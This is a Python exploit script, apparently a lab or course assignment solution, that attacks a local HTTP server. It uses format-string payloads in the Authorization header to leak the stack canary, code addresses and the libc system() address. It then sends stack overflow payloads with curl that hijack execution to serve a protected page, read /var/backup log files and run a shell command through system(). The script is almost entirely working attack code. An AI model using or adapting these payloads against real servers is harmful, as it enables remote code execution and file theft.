#!/usr/bin/python

import requests
import base64
import os

url = 'http://127.0.0.1:8000/ultimate.html'


def prepare_message(message):
	message_bytes = message.encode('ascii')
	base64_bytes = base64.b64encode(message_bytes)
	headers = {
		'Authorization': 'Basic '+base64_bytes.decode()
	}
	return headers


#get canary
headers = prepare_message("%x "*27)
print("Get Canary")
r = requests.post(url , headers=headers )
canary_string = r.headers['WWW-Authenticate']
canary_tokens = canary_string.split(sep=" ")
canary = canary_tokens[-2]
print(canary)

if(len(canary_tokens[-2]) < 8 ):
    canary = '0'+ canary

canary = bytes.fromhex(canary) 
#remove last byte which is \x00
canary = canary[:-1]
#replace it with & -> hex \x26
canary += bytes.fromhex('26')
print(canary)
#then reverse it
canary = canary[::-1]

print(canary)



#get post_data address
headers = prepare_message("%x "*30)
print("\nGet Post_data")
r = requests.post(url , headers=headers )
post_data_string = r.headers['WWW-Authenticate']
post_data_tokens = post_data_string.split(sep=" ")
post_data = "0x" + post_data_tokens[-2]
#use addresses that we found with gdb locally
post_data = int(post_data, 16) + (0xffffce20 - 0xffffcf08)


systemarg = post_data + 0x58
systemarg = bytes.fromhex(hex(systemarg)[2:]) 
systemarg = systemarg[::-1]

post_data = bytes.fromhex(hex(post_data)[2:]) 
#then reverse it
post_data = post_data[::-1]
print(post_data)


#get serve ultimate address
headers = prepare_message("%x "*31)
print("\nGet Ultimate")
r = requests.post(url , headers=headers )
ultimate_string = r.headers['WWW-Authenticate']
ultimate_tokens = ultimate_string.split(sep=" ")
ultimate = ultimate_tokens[-2]
if(len(ultimate_tokens[-2]) < 8 ):
    ultimate = '0'+ ultimate

ultimate = "0x" + ultimate
ultimate = int(ultimate, 16) + ( 0x5655689d - 0x56556015)
ultimate = bytes.fromhex(hex(ultimate)[2:]) 
#then reverse it
ultimate = ultimate[::-1]
print(ultimate)

#get send file address
headers = prepare_message("%x "*31)
print("\nGet send_file")
r = requests.post(url , headers=headers )
send_file_string = r.headers['WWW-Authenticate']
send_file_tokens = send_file_string.split(sep=" ")
send_file = send_file_tokens[-2]
if(len(send_file_tokens[-2]) < 8 ):
    send_file = '0'+ send_file

send_file = "0x" + send_file
send_file = int(send_file, 16) + ( 0x5655666e - 0x56556015)
send_file = bytes.fromhex(hex(send_file)[2:]) 
#then reverse it
send_file = send_file[::-1]
print(send_file)



#get system 
headers = prepare_message("%x "*115)
print("\nGet system")
r = requests.post(url , headers=headers )
system_string = r.headers['WWW-Authenticate']
system_tokens = system_string.split(sep=" ")
system = system_tokens[-2]
system = "0x" + system
system = int(system, 16) + ( 0xf7b6d2e0 - 0xf7b48f21 )
system = bytes.fromhex(hex(system)[2:]) 
#then reverse it
system = system[::-1]
print(system)



print("\n\n\nEROTIMA 3\n\n\n")
payload = 15 * post_data + canary + 3 * post_data + ultimate
curl = b'curl --max-time 3 --http0.9 -X POST -H "Content-Length:0" -H "Authorization:Basic YWRtaW46Ym9iJ3MgeW91ciB1bmNsZQ==" --data-raw "' + payload + b'" '+ str.encode(url)
# print(curl)
print("serve_ultimate:")	
os.system(curl)

print("\n\n\nEROTIMA 4\n\n\n")
payload = b'/var/backup/backup.log&&' + 9 * post_data + canary + 3 * post_data + send_file + 4 * post_data
curl = b'curl -X POST --http0.9  --max-time 3 -H "Content-Length:0" -H "Authorization:Basic YWRtaW46Ym9iJ3MgeW91ciB1bmNsZQ==" --data-raw "' + payload + b'" '+ str.encode(url)
print("/var/backup/backup.log:")
os.system(curl)
print("\n\n")
payload = b'/var/backup/z.log&&&' + 10 * post_data + canary + 3 * post_data + send_file + 4 * post_data
curl = b'curl -X POST --http0.9 --max-time 3 -H "Content-Length:0" -H "Authorization:Basic YWRtaW46Ym9iJ3MgeW91ciB1bmNsZQ==" --data-raw "' + payload + b'" '+ str.encode(url)
print("/var/backup/z.log:")
os.system(curl)


print("\n\n\nEROTIMA 5\n\n\n")
payload = 15 * post_data + canary + 3 * post_data + system + post_data + systemarg + b'dig +short myip.opendns.com @resolver1.opendns.com'
curl = b'curl -X POST --http0.9   -H "Content-Length:0" -H "Authorization:Basic YWRtaW46Ym9iJ3MgeW91ciB1bmNsZQ==" --data-raw "' + payload + b'" '+ str.encode(url)
os.system(curl)
print("\n\n")
